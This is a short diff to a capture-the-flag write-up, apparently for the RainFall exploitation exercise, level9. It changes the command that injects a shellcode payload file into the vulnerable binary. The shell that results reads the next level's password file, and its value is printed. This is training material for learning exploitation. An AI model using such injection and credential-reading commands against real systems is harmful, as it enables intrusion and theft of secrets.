@@ -100,7 +100,7 @@ To calculate the start of our ShellCode we just have to addition the buffer adre
 Perfect, we just have to inject the payload into the program.
 
 ```shell
-level9@RainFall:~$ ./level9 $(cat /tmp/payload_10)
+level9@RainFall:~$ ./level9 $(cat /tmp/payload)
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
